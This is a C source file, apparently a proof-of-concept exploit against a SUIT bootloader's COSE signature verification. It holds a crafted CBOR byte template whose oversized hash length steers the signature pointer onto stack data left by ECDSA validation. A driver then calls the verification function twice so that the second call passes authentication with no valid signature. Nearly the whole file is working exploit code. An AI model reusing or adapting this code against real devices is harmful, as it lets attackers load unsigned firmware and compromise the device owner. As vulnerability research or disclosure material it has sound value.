#include "stubs.h"
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#include "suit_bootloader.h"
#include "suit_parser.h"


/* Exploit input template. */
uint8_t cose_auth_bstr_mod_template[] = {
0x58, 0x70,   // Byte string

0x81, // Single element array

0xD2,  // Sing 1

0x84, // 4 element array

0x43,0xA1,0x01,0x26,  // Pheader (algoiId)

0xA0,  // Uheader - empty map

// The length of the hash byte string is set so the next (sginature) p will
// be pointing to the stack variable representing the r value internally computed
// by ECDSA validation function.
0x5B,

// THE RELATIVE OFFSET
// Depending on the target architecture pointer size it may need to be of different length
// Below a 64-bit pointer math assumed
0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFD, 0x6B,

// Payload - AlgId + Hash
0x82,0x02,0x58,0x20,
// The hash of malicious input
0xAA,0xBB,0xCC,0xDD,0xAA,0xBB,0xCC,0xDD,0xCA,0xFE,0xBA,0xBE,0xDE,0xAD,0xBE,0xEF,
0xAA,0xBB,0xCC,0xDD,0xAA,0xBB,0xCC,0xDD,0xCA,0xFE,0xBA,0xBE,0xDE,0xAD,0xBE,0xEF,

// Signature
// The payload is not important at all
0x58,0x40,
0xAA,0xBB,0xCC,0xDD,0xAA,0xBB,0xCC,0xDD,0xCA,0xFE,0xBA,0xBE,0xDE,0xAD,0xBE,0xEF,
0xAA,0xBB,0xCC,0xDD,0xAA,0xBB,0xCC,0xDD,0xCA,0xFE,0xBA,0xBE,0xDE,0xAD,0xBE,0xEF,
0xAA,0xBB,0xCC,0xDD,0xAA,0xBB,0xCC,0xDD,0xCA,0xFE,0xBA,0xBE,0xDE,0xAD,0xBE,0xEF,
0xAA,0xBB,0xCC,0xDD,0xAA,0xBB,0xCC,0xDD,0xCA,0xFE,0xBA,0xBE,0xDE,0xAD,0xBE,0xEF,
};

void prepare()
{
	uint8_t buffer[1024];
	uint64_t ii;
	memset(buffer, 0x58, sizeof(buffer));
}

/* A helper function to find the s value that will result in desired
 * bytes preceeding rx on the stack.
 *
 */
void helper_find_the_s()
{
    uint32_t round = 0;
    uint8_t auth_buffer[512];

    for (round = 0; round < 256; round++)
    {
    	prepare();
    	memcpy(auth_buffer, cose_auth_bstr_mod_template, sizeof(cose_auth_bstr_mod_template));
    	auth_buffer[sizeof(cose_auth_bstr_mod_template) -1] = (uint8_t)round;
    	do_cose_auth(
    	    auth_buffer,
    	    NULL,
    	    0);
    }
}

/*
 * 1) Prepare stack (or count on luck with reasonably high prob.)
 * 2) Trigger first run which will set the signature on stack.
 * 3) Trigger second run which will use the signature and pass authentication without
 *    valid signature.
 */
int main(int argc, char *argv[]) 
{
    int result_code = 0;
    uint8_t auth_buffer[512];
    helper_find_the_s();
    memcpy(auth_buffer, cose_auth_bstr_mod_template, sizeof(cose_auth_bstr_mod_template));
    prepare();

    /* Pass the exploit input to verification function. */
    /* First run - expected to fail*/
    result_code = do_cose_auth(
    auth_buffer,
    NULL,
    0);

    /* Second run - pass with invalid signature. */
    result_code = do_cose_auth(
    auth_buffer,
    NULL,
    0);

    printf("Second run result code: %d\r\n", result_code);

    return 0;
}
